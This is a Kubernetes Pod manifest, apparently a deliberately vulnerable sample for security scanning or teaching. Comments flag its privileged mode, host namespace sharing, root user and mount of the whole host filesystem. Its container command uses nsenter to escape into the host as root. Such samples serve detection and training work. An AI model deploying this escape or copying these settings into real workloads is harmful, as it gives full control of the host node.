apiVersion: v1
kind: Pod
metadata:
  name: sample-01-privileged-pod
  namespace: default
spec:
  hostPID: true         # VULN: shares host process namespace
  hostIPC: true         # VULN: shares host IPC namespace
  hostNetwork: true     # VULN: shares host network namespace
  containers:
    - name: pwned
      image: ubuntu:latest
      securityContext:
        privileged: true          # VULN: full host access — container escape
        runAsUser: 0              # VULN: running as root
        allowPrivilegeEscalation: true  # VULN: can gain more privileges
      command: ["/bin/sh", "-c", "nsenter --target 1 --mount --uts --ipc --net --pid -- bash"]
      volumeMounts:
        - name: host-root
          mountPath: /hostroot    # VULN: mounts entire host filesystem
  volumes:
    - name: host-root
      hostPath:
        path: /                   # VULN: full host filesystem mounted
